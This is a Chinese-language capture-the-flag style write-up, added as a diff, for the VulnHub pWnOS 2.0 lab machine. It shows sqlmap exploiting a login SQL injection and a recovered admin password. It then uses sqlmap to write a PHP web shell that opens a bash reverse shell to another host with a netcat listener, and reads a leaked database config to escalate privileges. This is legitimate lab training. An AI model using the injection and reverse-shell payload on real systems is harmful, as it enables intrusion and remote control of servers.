@@ -1,0 +1,99 @@
+---
+title: VulnHub pWnOS：2.0
+date: 2026-04-01 16:10:00
+categories: 
+  - VulnHub
+tags:
+  - SQL 注入
+  - 弱口令
+  - RCE
+  - PHP 反弹 Shell
+  - 信息泄露
+---
+
+# pWnOS: 2.0
+
+项目地址：https://download.vulnhub.com/pwnos/pWnOS_v2.0.7z
+
+是一个打包好的镜像文件
+
+**注意：虚拟机网段必须是 10.10.10.0/24，靶机是固定 IP 地址：10.10.10.100**
+
+使用 Nmap 扫描出开放服务及操作系统版本
+
+![](https://pic1.imgdb.cn/item/6976592f6deeadc41a33f580.png)
+
+## SQL 注入
+
+### login
+
+在首页登陆处
+
+![](https://pic1.imgdb.cn/item/69765c106deeadc41a33f5c7.png)
+
+SQLMap 最高强度梭哈出 `email` 注入点
+
+![](https://pic1.imgdb.cn/item/69765ca16deeadc41a33f5ca.png)
+
+![](https://pic1.imgdb.cn/item/697672096deeadc41a33f666.png)
+
+## 弱口令
+
+### IsIntS
+
+通过上面的 SQL 注入直接登录进去
+
+```
+admin@isints.com:killerbeesareflying
+```
+
+![](https://pic1.imgdb.cn/item/697679b26deeadc41a33f696.png)
+
+## RCE
+
+### PHP 反弹 Shell
+
+继上面 SQL 注入还能写入 PHP 反弹 Shell 文件
+
+```bash
+# 使用 sqlmap 写入指定文件的命令
+sqlmap -u http://10.10.10.100/login.php --data "email=123%40qq.com&pass=1&submit=Login&submitted=TRUE" -p email --file-write="shell1.php" --file-dest="/var/www/shell1.php" --batch
+
+# shell1.php
+<?php system("bash -c 'bash -i &>/dev/tcp/10.10.10.128/1234 0>&1'");?>
+
+# 开启监听
+nc -lvnp 1234
+```
+
+![](https://pic1.imgdb.cn/item/69771e96a583b567209b7db3.png)
+
+### Simple PHP Blog（CVE-2005-2733）
+
+查看网页发现使用的框架
+
+![](https://pic1.imgdb.cn/item/69b29f108bff4b5d2a20444d.png)
+
+老 NDday 了，不过多赘述
+
+![](https://pic1.imgdb.cn/item/69767db86deeadc41a33f6b0.png)
+
+## 提权
+
+### 信息泄露
+
+发现一个有关数据库的文件
+
+```bash
+cat /var/mysqli_connect.php
+```
+
+![](https://pic1.imgdb.cn/item/69771ec2a583b567209b7db8.png)
+
+提权成功
+
+![](https://pic1.imgdb.cn/item/69767e436deeadc41a33f6b1.png)
+
+## 补充说明
+
+本靶机 Simple PHP Blog 可以直接打 Nday，所以不会记录
